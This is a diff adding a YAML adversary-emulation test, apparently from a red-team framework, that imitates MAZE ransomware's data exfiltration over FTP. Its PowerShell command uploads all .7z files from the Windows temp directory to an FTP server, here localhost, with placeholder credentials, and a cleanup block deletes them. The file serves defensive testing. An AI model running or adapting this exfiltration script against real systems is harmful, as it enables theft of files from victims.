@@ -1,0 +1,30 @@
+- id: 081d565f-a494-5009-85b4-b870334ca682
+  name: Soumaia ART Tests - MAZE FTP Upload
+  description: "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents"
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          $Dir_to_copy = "$env:windir\temp"
+          $ftp = "ftp://127.0.0.1/"
+          $web_client = New-Object System.Net.WebClient
+          $web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')
+          if (test-connection -count 1 -computername "127.0.0.1" -quiet)
+          {foreach($file in (dir $Dir_to_copy "*.7z"))
+          {echo "Uploading $file..."
+          $uri = New-Object System.Uri($ftp+$file.name)
+          $web_client.UploadFile($uri, $file.FullName)}}
+          else
+          {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
+        cleanup: |-
+          $ftp = "ftp://127.0.0.1/"
+          try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
+          {$uri = New-Object System.Uri($ftp+$file.name)
+           $ftp_del = [System.Net.FtpWebRequest]::create($uri)
+           $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')
+           $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
+           $ftp_del.GetResponse()}} catch{}
